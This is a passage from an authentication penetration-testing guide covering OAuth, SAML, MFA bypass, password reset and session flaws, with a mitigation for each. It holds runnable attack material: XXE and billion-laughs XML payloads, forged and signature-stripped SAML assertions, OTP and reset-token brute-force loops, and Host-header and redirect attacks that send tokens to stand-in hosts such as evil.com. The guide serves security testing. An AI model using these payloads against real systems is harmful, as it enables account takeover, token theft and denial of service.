**Mitigation:** Use PKCE to prevent code interception. Use short code lifetimes (60 seconds). Use HTTPS exclusively.

---

### 3.4 Token Theft via Referer Header

**Root Cause:** OAuth tokens or authorization codes are leaked through the Referer header when the redirect page loads external resources.

**Testing Steps:**

1. Complete an OAuth flow and land on the callback URL that contains tokens/codes.
2. Check if the callback page loads any third-party resources (images, scripts, fonts).
3. The Referer header sent to those resources contains the full callback URL including tokens.

**Server-side Test:**
```
curl -s -I "https://target.com/callback" | findstr /i "referrer-policy"
# Expected: Referrer-Policy: no-referrer
```

**Mitigation:** Set `Referrer-Policy: no-referrer` on the callback page. Use `rel="noreferrer"` on external links. Use fragment (`#`) instead of query string for tokens.

---

### 3.5 Client Secret Leak / Scope Escalation

**Root Cause:** OAuth client credentials leaked via mobile app decompilation, JS bundle, public repo, or source maps allow scope escalation or token forgery.

**Testing Steps:**

1. Search for `client_secret` in mobile apps (APK decompilation), JS bundles, public repos.
2. Use the leaked `client_secret` with the `client_credentials` grant to obtain an access token.
3. Test scope enumeration by requesting different/more permissive scopes.

**curl Examples:**

```
CLIENT_ID="com.target.app"
CLIENT_SECRET="hunter2"

curl -X POST "https://auth.target.com/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=client_credentials&client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET"

curl -X POST "https://auth.target.com/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=client_credentials&client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET&scope=admin%20users.read%20users.write%20payments.read"
```

**Request/Response Example:**

```
POST /oauth/token HTTP/1.1
Host: auth.target.com
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials&client_id=leaked_app&client_secret=supersecret&scope=admin

--- Response: 200 OK ---
HTTP/1.1 200 OK
{
  "access_token": "eyJhbGciOiJSUzI1NiJ9...",
  "token_type": "Bearer",
  "scope": "admin",
  "expires_in": 3600
}
```

**Mitigation:** Never embed client_secret in mobile/native apps (use PKCE). Validate requested scopes against client's registered scopes. Rotate secrets when leaked.

---

### 3.6 PKCE Downgrade Attack

**Root Cause:** The authorization server supports both PKCE and non-PKCE flows for the same client, allowing an attacker to downgrade to the non-PKCE flow.

**Testing Steps:**

1. Initiate the OAuth flow without the `code_challenge` parameter.
2. If the server proceeds without PKCE, the authorization code is vulnerable to interception.

```
# Normal PKCE flow
GET /authorize?response_type=code&client_id=app&code_challenge=E9Melhoa2Ow&code_challenge_method=S256

# Downgrade — no code_challenge
GET /authorize?response_type=code&client_id=app

# Downgrade — no code_challenge_method
GET /authorize?response_type=code&client_id=app&code_challenge=E9Melhoa2Ow

# Downgrade — plain method (S256 is secure, plain is not)
GET /authorize?response_type=code&client_id=app&code_challenge=guessable&code_challenge_method=plain
```

**Mitigation:** Require PKCE for all public clients. Reject authorization requests without `code_challenge` when PKCE is mandated.

---

### 3.7 Open Redirect via OAuth Flow

**Root Cause:** The OAuth callback or authorization endpoint allows redirecting to arbitrary URLs, facilitating phishing.

**Testing Steps:**

1. Identify any parameter that accepts a URL/redirect target.
2. Test for open redirect behavior.

Common open redirect parameters: `redirect_uri`, `redirect`, `redirect_to`, `next`, `url`, `target`, `return`, `return_to`, `return_url`, `callback`, `continue`, `referer`, `destination`, `relay_state`, `RelayState`.

**curl Examples:**
```
curl -X GET "https://target.com/oauth/authorize?client_id=app&redirect_uri=https://evil.com/phish"
curl -X GET "https://target.com/oauth/callback?code=x&state=y&redirect=https://evil.com"
curl -X GET "https://target.com/login?next=https://evil.com"
```

**Mitigation:** Strictly validate redirect URIs against a whitelist. Do not accept arbitrary redirect targets.

---

### 3.8 Covert Redirect via Fragment

**Root Cause:** The OAuth flow uses `#` (fragment) for tokens, and the application parses the fragment to redirect to a new URL without proper validation.

**Testing:**
```
# If the SPA reads the fragment and redirects:
https://target.com/callback#access_token=...&redirect_uri=https://evil.com
# The SPA may redirect to evil.com with the token

curl -X GET "https://target.com/callback#access_token=token&redirect_uri=https://evil.com/steal" -H "User-Agent: Mozilla/5.0"
```

**Mitigation:** Validate redirect destinations even in fragment-based flows.

---

### 3.9 Implicit Grant Token Interception

**Root Cause:** The implicit grant flow returns tokens in the URL fragment, making them vulnerable to interception via browser history, referer headers, and extensions.

**Testing Steps:**

1. Check if the application still uses the implicit grant (`response_type=token`).
2. Check if the fragment containing the token leaks via referer headers.
3. Check browser history for token presence.

```
# Implicit grant URL structure
GET /authorize?response_type=token&client_id=app&redirect_uri=https://target.com/callback

# After login, user is redirected to:
# https://target.com/callback#access_token=eyJhbGci...&token_type=Bearer&expires_in=3600
```

**Mitigation:** Use the authorization code grant with PKCE instead of implicit grant.

---

### 3.10 Refresh Token Reuse / Rotation Flaws

**Root Cause:** Refresh tokens are long-lived and can be reused, allowing an attacker who steals a refresh token to maintain persistent access.

**Testing Steps:**

1. Capture both an access token and a refresh token.
2. Use the refresh token to get a new access token.
3. Use the SAME refresh token again. If it works on the second use, rotation is not implemented.
4. If rotation IS implemented, check if the old refresh token is still valid (rotation with reuse detection).

```
curl -X POST "https://auth.target.com/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=refresh_token&client_id=app&refresh_token=first_refresh"

curl -X POST "https://auth.target.com/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=refresh_token&client_id=app&refresh_token=first_refresh"
```

**Mitigation:** Implement refresh token rotation. Invalidate old refresh tokens when new ones are issued. If a revoked token is reused, revoke all tokens for that user (reuse detection).

---

### 3.11 OAuth Account Linking CSRF

**Root Cause:** The OAuth "Login with X" or "Connect to X" feature lacks CSRF protection, allowing an attacker to link a victim's account to the attacker's external identity.

**curl Testing:**

1. Initiate an account linking flow (e.g., Connect your Google account).
2. Capture the request and check for CSRF tokens.
3. Replay the request from a different session.

```
POST /oauth/connect HTTP/1.1
Cookie: session=victim
Content-Type: application/x-www-form-urlencoded

provider=google&external_id=attacker_google_id
```

**Mitigation:** Require CSRF tokens for account linking operations. Require re-authentication for sensitive account changes.

---

## 4. SAML Attacks

### 4.1 XML Signature Wrapping (XSW1-XSW8)

**Root Cause:** The SAML response parser validates the XML Digital Signature against the referenced element but uses a different (possibly attacker-controlled) element for processing assertions.

**Common XSW Techniques:**

| XSW | Technique | Description |
|-----|-----------|-------------|
| XSW1 | Duplicate element after signed element | Parser reads second occurrence after validating first |
| XSW2 | Modify ID reference | Signature references original element ID but parser processes modified copy |
| XSW3 | Wrap in wrapper element | Signature validates original; parser reads unwrapped copy |
| XSW4 | XSLT transform | Transform modifies content after signature validation |
| XSW5 | XPath manipulation | Signature validation XPath differs from processing XPath |
| XSW6 | Context manipulation | Change the context node(s) after signature validation |
| XSW7 | SOAP body manipulation | Multiple SOAP bodies; validate one, process another |
| XSW8 | Extended XSW combinations | Multi-layer wrapping with namespace tricks |

**XSW1 — Basic Duplicate Element:**

```xml
<!-- XSW1 — add second assertion after signed one; parser validates first, uses second -->
<saml:Response>
  <saml:Assertion ID="signed_assertion" IssueInstant="2026-06-06T00:00:00Z">
    <ds:Signature>...</ds:Signature>
    <saml:Subject>
      <saml:NameID>victim@target.com</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>user</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
  <saml:Assertion ID="attacker_assertion" IssueInstant="2026-06-06T00:00:00Z">
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>admin</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</saml:Response>
```

**Testing Steps (Burp Suite SAML Raider):**

1. Intercept the SAML Response.
2. Use SAML Raider to remove/reorder elements.
3. Create a duplicate of the signed assertion with modified content.
4. Send the wrapped response.

**curl + XML Manipulation:**

```
SAML_RESPONSE=$(curl -s "https://target.com/saml/callback" \
  -d "SAMLResponse=$(cat encoded_response)")
echo $SAML_RESPONSE | base64 -d > original.xml

# Modify the XML to add a wrapped assertion

cat modified.xml | base64 -w0 > encoded_payload
curl -X POST "https://target.com/saml/callback" \
  -d "SAMLResponse=$(cat encoded_payload)"
```

**Mitigation:** After signature validation, verify that the validated element is the ONLY one used for processing. Use the ID reference to retrieve the specific element after validation.

---

### 4.2 Comment Injection in NameID

**Root Cause:** The `NameID` field contains XML comments that different parsers handle differently during comparison and rendering.

**Attack:**
```xml
<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
  admin@target.com<!--evil-->@attacker.com
</saml:NameID>
```

**How It Works:**
- The SP's NameID policy expects `admin@target.com`
- Some parsers strip comments and see `admin@target.com@attacker.com`
- Some parsers compare the outer text ignoring comments: `admin@target.com`
- Some applications use the full text including the comment content

**Testing Steps:**

1. Get a valid SAML response from an IdP you control (or intercept one).
2. Modify the `NameID` to include XML comments.
3. Observe how the SP processes the NameID.

```xml
<saml:NameID>user@target.com<!--comment--></saml:NameID>
<saml:NameID>admin@target.com<!-->@evil.com</saml:NameID>
<saml:NameID>user<!--admin-->@target.com</saml:NameID>
```

**Mitigation:** Strip XML comments from NameID before comparison. Use a strict parser. Validate NameID format strictly.

---

### 4.3 Signature Stripping

**Root Cause:** The SP does not require a signature on the SAML Assertion or Response, allowing the attacker to remove the `<ds:Signature>` element entirely and modify the assertion content.

**Testing Steps:**

1. Intercept a valid SAML Response.
2. Remove the entire `<ds:Signature>` element and any `<ds:SignatureInfo>` references.
3. Modify the assertion (user, role, attributes).
4. Send the modified response.

**After Stripping:**
```xml
<saml:Response>
  <saml:Assertion ID="id123">
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>admin</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</saml:Response>
```

**curl:**
```
cat stripped_response.xml | base64 -w0 > stripped_encoded.txt
curl -X POST "https://target.com/saml/callback" \
  -d "SAMLResponse=$(cat stripped_encoded.txt)"
```

**Mitigation:** Always require and verify SAML Assertion/Response signatures. Set `authnRequestsSigned` and `wantAssertionsSigned` to true.

---

### 4.4 IdP Confusion / Key Confusion

**Root Cause:** The SP trusts assertions signed by any key, including a key controlled by the attacker, or accepts assertions from any IdP.

**Attack Scenario:**

1. Register a new IdP on the SP (if self-service IdP registration exists).
2. Create a SAML assertion signed by the attacker's IdP key.
3. If the SP trusts any key, the attacker's assertion is accepted.

**Testing Steps:**

1. Find the SP's metadata endpoint (usually `https://sp.target.com/SAML2/Metadata`).
2. Find allowed IdP certificates.
3. If you can register an IdP or the SP accepts unknown IdPs, forge assertions.

```
curl -s "https://target.com/SAML2/Metadata"
```

**Mitigation:** Validate the Issuer against a whitelist. Validate the signing certificate against a trusted store. Implement strict IdP discovery.

---

### 4.5 Replay Attack

**Root Cause:** No `NotBefore`/`NotOnOrAfter` conditions, or the same SAML assertion can be submitted multiple times within its validity window.

**Testing Steps:**

1. Capture a valid SAML Response.
2. Immediately submit it again (same assertion).
3. If the server accepts it, replay is possible.
4. Try submitting after a delay (within the validity window).

```
curl -X POST "https://target.com/saml/callback" \
  -d "SAMLResponse=$(captured_encoded_response)"
# First time: success

curl -X POST "https://target.com/saml/callback" \
  -d "SAMLResponse=$(captured_encoded_response)"
# Second time: also success = replay
```

**Mitigation:** Implement `NotOnOrAfter` with short validity (max 5 minutes). Track `AssertionID`/`ID` values and reject duplicates. Consider implementing OneTimeUse condition.

---

### 4.6 Audience Restriction Bypass

**Root Cause:** The SAML assertion's `<AudienceRestriction>` is not validated, or the attacker can change the audience to match the victim SP.

**Testing:**

```xml
<saml:Conditions>
  <saml:AudienceRestriction>
    <saml:Audience>https://target.com/sp</saml:Audience>
  </saml:AudienceRestriction>
</saml:Conditions>

<!-- Test with wrong audience -->
<saml:Conditions>
  <saml:AudienceRestriction>
    <saml:Audience>https://evil.com/sp</saml:Audience>
  </saml:AudienceRestriction>
</saml:Conditions>

<!-- Test with no audience -->
<saml:Conditions>
</saml:Conditions>
```

**Mitigation:** Always validate the Audience against the expected SP entity ID. Reject assertions with no audience or wrong audience.

---

### 4.7 XML External Entity (XXE) in SAML

**Root Cause:** The SAML XML parser resolves external entities, allowing SSRF or file disclosure.

**Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<saml:Response>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</saml:Response>
```

**Testing:**
```
echo '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><saml:Response><saml:Assertion><saml:Subject><saml:NameID>&xxe;</saml:NameID></saml:Subject></saml:Assertion></saml:Response>' | base64 -w0 > xxe_payload.txt
curl -X POST "https://target.com/saml/callback" \
  -d "SAMLResponse=$(cat xxe_payload.txt)"
```

**Mitigation:** Disable DOCTYPE processing and external entity resolution in the XML parser.

---

### 4.8 XML Bombs (Billion Laughs) in SAML

**Root Cause:** The SAML XML parser is vulnerable to entity expansion attacks causing denial of service.

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<saml:Response>&lol4;</saml:Response>
```

**Mitigation:** Limit entity expansion depth. Use XML parser with entity expansion limits (`setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)`).

---

## 5. MFA / 2FA Bypass (7 Patterns)

### 5.1 Pattern 1: MFA Not Enforced on Sensitive Endpoints

**Root Cause:** MFA is required at login but not enforced on sensitive downstream endpoints like password change, email change, API token generation, or payment actions.

**Testing Steps:**

1. Log in with MFA.
2. Capture session cookies/tokens.
3. Navigate directly to sensitive endpoints (password change, email change, API settings).
4. Clear browser state and log in to a different account.
5. Test if the sensitive endpoint requires MFA step-up auth.

**curl Examples:**

```
curl -X POST "https://target.com/login" \
  -d "username=user1&password=pass1&otp=123456" \
  -c cookies.txt

curl -X POST "https://target.com/account/password/change" \
  -b cookies.txt \
  -d "new_password=NewP@ss123&confirm_password=NewP@ss123"

curl -X POST "https://target.com/account/email/change" \
  -b cookies.txt \
  -d "new_email=attacker@evil.com"

curl -X POST "https://target.com/settings/api/tokens" \
  -b cookies.txt \
  -d "label=test&scope=full_access"

curl -X GET "https://target.com/admin/user/delete?uid=123" \
  -b cookies.txt
```

**Request/Response Example:**

```
POST /account/email/change HTTP/1.1
Host: target.com
Cookie: session=authenticated_session
Content-Type: application/x-www-form-urlencoded

new_email=attacker@evil.com

--- Response: 200 OK ---
HTTP/1.1 200 OK
Email changed successfully.
```

**Detection:** Map every authenticated endpoint and check each for MFA step-up enforcement.

**Mitigation:** Require MFA step-up for all sensitive operations: password/email changes, MFA settings changes, API token generation, high-value transactions, admin actions.

---

### 5.2 Pattern 2: MFA Step Skip via Direct Navigation

**Root Cause:** After successful password authentication, the application sets a partial session that allows MFA step to be skipped by directly navigating to the post-MFA URL.

**Testing Steps:**

1. Enter correct username/password.
2. Intercept the request after password verification (before MFA prompt).
3. Instead of submitting the MFA code, directly navigate to `/dashboard`, `/home`, `/account`, or any post-login page.
4. If the application accepts the partial session without MFA, the MFA step is bypassed.

**curl Example:**

```
curl -X POST "https://target.com/login" \
  -d "username=user1&password=pass1" \
  -c cookies.txt -L --max-redirs 0

curl -X GET "https://target.com/dashboard" \
  -b cookies.txt
```

**Request/Response Example:**

```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=victim&password=victimpass

--- Response: 302 ---
HTTP/1.1 302 Found
Set-Cookie: partial_session=abc123; HttpOnly
Location: /mfa/challenge

--- Attacker ignores redirect and goes to /dashboard ---

GET /dashboard HTTP/1.1
Host: target.com
Cookie: partial_session=abc123

--- Response: 200 OK ---
HTTP/1.1 200 OK
Welcome to your dashboard!
```

**Variation — API-based MFA skip:**
```
POST /api/login
{"username":"user1","password":"pass1"}
-> {"mfa_required":true,"token":"partial_token"}

GET /api/account
Authorization: Bearer partial_token
-> {"email":"user@target.com","sensitive_data":"leaked"}
```

**Mitigation:** Do not issue partial tokens/sessions after password auth. Use a server-side state machine that enforces MFA completion before granting access. Validate MFA completion on every request until MFA is done.

---

### 5.3 Pattern 3: MFA Token Replay

**Root Cause:** The same one-time code (OTP/TOTP) can be used more than once within its validity window.

**Testing Steps:**

1. Complete MFA with a valid OTP.
2. Immediately attempt to authenticate again with the SAME OTP.
3. If it works, the OTP is replayable.

```
curl -X POST "https://target.com/mfa/verify" \
  -b "session=token123" \
  -d "code=123456"

curl -X POST "https://target.com/mfa/verify" \
  -b "session=token456" \
  -d "code=123456"
```

**Request/Response Example:**

```
POST /mfa/verify HTTP/1.1
Host: target.com
Cookie: session=partial_session_1
Content-Type: application/x-www-form-urlencoded

code=123456

--- Response: 200 OK ---
HTTP/1.1 200 OK
{"status":"authenticated","session":"fully_authenticated_1"}

--- Replay with different session ---

POST /mfa/verify HTTP/1.1
Host: target.com
Cookie: session=partial_session_2
Content-Type: application/x-www-form-urlencoded

code=123456

--- Response: 200 OK ---
HTTP/1.1 200 OK
{"status":"authenticated","session":"fully_authenticated_2"}
```

**Mitigation:** Invalidate OTP/TOTP codes after first successful use. Use jti (JWT ID) or one-time-use keys. Implement a server-side check for consumed tokens.

---

### 5.4 Pattern 4: Brute-Force OTP

**Root Cause:** 6-digit OTP codes (1,000,000 possibilities) are not rate-limited, allowing brute-force.

**Testing Steps:**

1. Start a login flow that triggers an OTP challenge.
2. Attempt multiple OTP values rapidly.
3. If there is no rate limiting or lockout after ~10 failed attempts, the OTP is bruteforceable.

```
for i in $(seq -w 000000 000010); do
  curl -s -X POST "https://target.com/mfa/verify" \
    -b "session=session123" \
    -d "code=$i" \
    -w "\n%{http_code}" | tail -1
done
```

**Expected Secure Response:**
```
POST /mfa/verify (code=000001) -> 401
POST /mfa/verify (code=000002) -> 401
POST /mfa/verify (code=000010) -> 429 Too Many Requests
```

**Vulnerable Response:**
```
All 10,000 attempts return 401, never 429/423
-> OTP can be fully bruteforced (1M attempts / 10 per sec = ~28 hours)
```

**Variation — Splitting across sessions:**
```
If rate limit is per-session, start multiple sessions:
Session 1: try 000000-000099
Session 2: try 000100-000199
Session N: try N*100 to (N+1)*100-1
```

**Mitigation:** Rate-limit OTP attempts per user (5 attempts per 15 minutes). Implement account lockout after 10 failed attempts. Use exponential backoff. Require CAPTCHA after 3 failed attempts.

---

### 5.5 Pattern 5: Race Condition on OTP Validation

**Root Cause:** The OTP validation endpoint has a TOCTOU (time-of-check-time-of-use) vulnerability where multiple simultaneous requests can race through validation with the same OTP.

**Testing Steps:**

1. Start a login flow with MFA.
2. Send multiple concurrent requests with the same OTP.
3. If two or more requests succeed, the race condition is exploitable.

**curl — Concurrent Requests:**
```
for i in $(seq 1 10); do
  curl -s -X POST "https://target.com/mfa/verify" \
    -b "session=sess$i" \
    -d "code=123456" &
done
wait
```

**Race Scenario:**
```
Time T+0: POST /mfa/verify (session=user1, code=123456)
Time T+0: POST /mfa/verify (session=user2, code=123456)
Time T+1: Request 1 -> code consumed, returns success for user1
Time T+1: Request 2 -> code already consumed, should fail...
            BUT if validation and consumption are not atomic,
            Request 2 might also pass.
```

**Mitigation:** Use atomic database operations for OTP validation and consumption (UPDATE ... WHERE consumed=false). Use database transactions or Redis single-threaded operations.

---

### 5.6 Pattern 6: Recovery Code Dump via API

**Root Cause:** MFA recovery or backup codes are exposed via an API endpoint that lacks proper authorization checks, or the codes are included in API responses without redaction.

**Testing Steps:**

1. Log in with a valid account.
2. Check the `/api/me`, `/api/account`, `/api/user/profile` endpoint for recovery codes.
3. Check any MFA settings endpoints for recovery codes.
4. Check if recovery codes are returned in registration or onboarding flows.

```
curl -X GET "https://target.com/api/me" \
  -H "Authorization: Bearer token123"

curl -X GET "https://target.com/api/account/mfa" \
  -H "Authorization: Bearer token123"
```

**Vulnerable Response:**
```json
{
  "id": 123,
  "email": "user@target.com",
  "mfa_enabled": true,
  "recovery_codes": [
    "ABCD-1234-EFGH-5678",
    "IJKL-9012-MNOP-3456"
  ]
}
```

**IDOR Variation:**
```
curl -X GET "https://target.com/api/admin/user/124/recovery-codes" \
  -H "Authorization: Bearer admin_token"
```

**Mitigation:** Only display recovery codes once during initial setup. Require password re-authentication to view recovery codes. Store recovery codes as hashes, not plaintext.

---

### 5.7 Pattern 7: Backup Factor Downgrade

**Root Cause:** When a user has multiple MFA factors (TOTP, SMS, push notification), an attacker can downgrade to a weaker factor.

**Testing Steps:**

1. Enroll in a strong MFA factor (TOTP app).
2. Initiate login; the server prompts for TOTP.
3. Check if the login endpoint accepts parameters like `factor=sms` or `preferred_method=sms` to switch to SMS OTP.
4. If SMS is less secure (SIM swap, SS7), the attacker can request SMS instead of TOTP.

```
curl -X POST "https://target.com/login" \
  -d "username=victim&password=pass"

curl -X POST "https://target.com/mfa/challenge" \
  -b "session=abc123" \
  -d "factor=sms"

curl -X POST "https://target.com/login" \
  -d "username=victim&password=pass&factor=sms"
```

**Factor Enumeration:**
```
curl -s -X POST "https://target.com/login" \
  -d "username=victim&password=temp" | jq '.available_factors'
```

**Vulnerable Response:**
```json
{
  "challenge": "totp",
  "available_factors": ["totp", "sms", "email", "push"],
  "can_select_factor": true
}
```

**Mitigation:** Do not allow users to downgrade their MFA factor. Require the strongest available factor. If multiple factors are allowed, require the user to select during setup. Rate-limit SMS sending per user.

---

## 6. Password Reset Flaws

### 6.1 Host Header Injection in Reset Link

**Root Cause:** The password reset email contains a link constructed from the `Host` header, allowing an attacker to control the domain in the reset link.

**Testing Steps:**

1. Initiate a password reset request.
2. Intercept the request and modify the `Host` header to point to an attacker-controlled domain.
3. If the server uses the `Host` header to construct the reset link, the victim will receive a link pointing to the attacker's domain.

**curl Examples:**

```
curl -X POST "https://target.com/password/reset" \
  -H "Host: evil.com" \
  -d "email=victim@target.com"

curl -X POST "https://target.com/password/reset" \
  -H "X-Forwarded-Host: evil.com" \
  -d "email=victim@target.com"

curl -X POST "https://target.com/password/reset" \
  -H "X-Original-Host: evil.com" \
  -d "email=victim@target.com"

curl -X POST "https://target.com/password/reset" \
  -H "X-Host: evil.com" \
  -d "email=victim@target.com"
```

**Request/Response Example:**

```
POST /password/reset HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com

--- Server constructs email link using Host header ---
--- Victim receives email with: ---
From: password-reset@target.com
Subject: Password Reset
Body: Click here to reset your password:
      https://evil.com/reset?token=abc123def456

--- Victim clicks link, token is sent to evil.com ---
--- Attacker captures token and resets victim's password ---
```

**Mitigation:** Never use the Host header to construct URLs. Use a configuration-based base URL. Set a fixed `ServerName` in web server config.

---

### 6.2 Predictable Reset Token

**Root Cause:** Password reset tokens are generated using predictable values like timestamp, sequential ID, username hash, or weak PRNG seeding.

**Testing Steps:**

1. Request multiple password resets for the same user and capture tokens.
2. Analyze tokens for patterns:
   - Timestamps (current epoch time, microseconds)
   - Sequential integers
   - Weak MD5/SHA1 of email + timestamp
   - Base64 encoded predictable values
   - Short token length (< 20 characters)

**curl Examples:**

```
curl -s -X POST "https://target.com/password/reset" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'

sleep 1

curl -s -X POST "https://target.com/password/reset" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'
```

**Token Analysis Examples:**
```
Token: 1760000000 -> epoch timestamp (predictable)
Token: dXNlcjEyMzoxNzYwMDAwMDAw -> base64(user123:1760000000)
Token: 550e8400-e29b-11d4 -> UUID v1 (contains timestamp)
```

**Token Bruteforce Script (Short Tokens):**
```
for i in $(seq -w 000000 999999); do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/password/reset/confirm" \
    -d "token=$i&new_password=NewP@ss123")
  if [ "$response" != "401" ] && [ "$response" != "400" ]; then
    echo "Valid token found: $i (HTTP $response)"
    break
  fi
done
```

**Mitigation:** Use cryptographically secure random bytes for tokens (e.g., PHP `random_bytes(32)` / Python `secrets.token_urlsafe(32)`). Set token minimum length to 32 bytes. Never include the token in API responses.

---

### 6.3 Token Leak in Referer Header

**Root Cause:** The password reset page loads external resources (images, scripts, fonts) or uses outbound links, causing the token to leak via the Referer header.

**Testing Steps:**

1. Open the password reset link in a browser.
2. Use a proxy (Burp Suite) to observe requests made by the reset page.
3. Check if any request to a third-party domain has the token in the Referer header.

**Example Detection:**
```
On https://target.com/reset?token=abc123

If the page loads:
<img src="https://analytics.evil.com/track" />
Referer header: https://target.com/reset?token=abc123
```

**Server-side Check:**
```
curl -s -I "https://target.com/reset" | findstr /i "referrer"
```

**Expected Headers:**
```
Referrer-Policy: no-referrer
Referrer-Policy: same-origin
Referrer-Policy: strict-origin-when-cross-origin
```

**Mitigation:** Set `Referrer-Policy: no-referrer` on all reset pages. Use `<meta name="referrer" content="no-referrer">`. Use `rel="noreferrer"` on all links. Avoid loading external resources on sensitive pages.

---

### 6.4 Race Condition on Reset Link

**Root Cause:** The password reset token can be used multiple times simultaneously, or the token generation and user confirmation are not properly synchronized.

**Testing Steps:**

1. Request a password reset for the target user.
2. Simultaneously submit the reset token with a new password for the same token from multiple sessions.
3. Check if the token can be reused after a successful reset.

**curl — Concurrent Reset:**
```
for i in $(seq 1 10); do
  curl -s -X POST "https://target.com/password/reset/confirm" \
    -d "token=abc123&new_password=NewP@ss$i" &
done
wait
```

**Testing Token Reuse After Reset:**
```
curl -X POST "https://target.com/password/reset/confirm" \
  -d "token=abc123&new_password=Password1"

curl -X POST "https://target.com/password/reset/confirm" \
  -d "token=abc123&new_password=Password2"
```

**Mitigation:** Use database-level locks or atomic operations for token consumption. Immediately invalidate the token after first successful use. Use `UPDATE tokens SET used=true WHERE token=X AND used=false`.

---

### 6.5 Token Not Invalidated After Use

**Root Cause:** The reset token remains valid after a successful password reset, allowing reuse.

**Testing Steps:**

1. Request a password reset.
2. Use the token to reset the password successfully.
3. Wait a few seconds.
4. Use the same token again to reset the password again.
5. If it works, the token was not invalidated.

```
curl -X POST "https://target.com/password/reset/confirm" \
  -d "token=abc123&new_password=Password1"

curl -X POST "https://target.com/password/reset/confirm" \
  -d "token=abc123&new_password=Password2"
```

**Mitigation:** Immediately invalidate tokens after use. Set `consumed_at` timestamp. Add `used=true` flag.

---

### 6.6 User Enumeration via Reset Endpoint

**Root Cause:** The password reset endpoint reveals whether an account exists or not through different responses.

**Testing Steps:**

1. Submit a known valid email, observe response.
2. Submit a non-existent email, observe response.
3. Compare the two responses (status code, response body, timing).

```
curl -s -X POST "https://target.com/password/reset" \
  -d "email=existing@target.com" \
  -w "\nTime: %{time_total}\n"

curl -s -X POST "https://target.com/password/reset" \
  -d "email=nonexistent@target.com" \
  -w "\nTime: %{time_total}\n"
```

**Vulnerable Patterns:**
| Pattern | Vulnerable? |
|---------|-------------|
| "Reset link sent" vs "User not found" | Yes |
| 200 OK vs 404 Not Found | Yes |
| 200 OK vs 400 Bad Request | Yes |
| Timing difference >200ms | Yes (timing oracle) |
| Same response for both | No |

**Mitigation:** Always return the same response regardless of user existence. Use consistent response timing (add artificial delay for non-existent users).

---

### 6.7 Password Reset Poisoning via Email

**Root Cause:** The password reset endpoint accepts an `email` or `username` parameter that doesn't match the token recipient, allowing an attacker to change another user's password if they know the token.

**Testing Steps:**

1. Register attacker@evil.com on the target.
2. Request a password reset for attacker@evil.com.
3. Capture the reset token (from email, or sometimes from the response).
4. Submit the token with victim@target.com's email address.
5. If the server resets the victim's password, the email parameter is not bound to the token.

```
curl -X POST "https://target.com/password/reset" \
  -d "email=attacker@evil.com"

curl -X POST "https://target.com/password/reset/confirm" \
  -d "email=victim@target.com&token=attacker_token&new_password=hacked"
```

**Mitigation:** Bind the token to the user account server-side. Do not trust the email parameter from the request — look up the user from the token.

---

## 7. Session Testing

### 7.1 Session Fixation

**Root Cause:** The application accepts a pre-established session ID from the user (via URL parameter or cookie) and does not regenerate it after authentication.

**Testing Steps:**

1. Obtain a fresh session ID from the application (before login).
2. Use the same session ID to login.
3. Check if the session ID was regenerated after login.
4. If the session ID remains the same, fixation is possible.

```
curl -s -I "https://target.com/" | findstr /i "Set-Cookie"

curl -X POST "https://target.com/login" \
  -b "session=abc123" \
  -d "username=victim&password=pass123"

curl -X GET "https://target.com/account" -b "session=abc123"
```

**Fixation via URL:**
```
# Some frameworks accept session ID via URL
https://target.com/login;jsessionid=abc123
```

**Mitigation:** Regenerate session ID on successful authentication. Do not accept session IDs via URL parameters. Use `session.use_only_cookies = 1` in PHP.

---

### 7.2 Session Prediction

**Root Cause:** Session tokens are generated using predictable algorithms: sequential numbers, timestamps, weak hashes, or user-specific data.

**Testing Steps:**

1. Obtain multiple session IDs in succession.
2. Analyze patterns: sequential, time-based, hash-based.
3. If predictable, generate a valid session for an arbitrary user.

```
for i in $(seq 1 10); do
  curl -s -I "https://target.com/" | findstr /i "Set-Cookie"
  sleep 0.1
done
```

**Analysis Examples:**
```
session=1001, session=1002, session=1003  -> Sequential integers
session=1760000000, session=1760000001  -> Timestamp increments
session=c4ca4238...  -> MD5(1), MD5(2) — weak hashes
```

**curl — Bruteforce Sequential Sessions:**
```
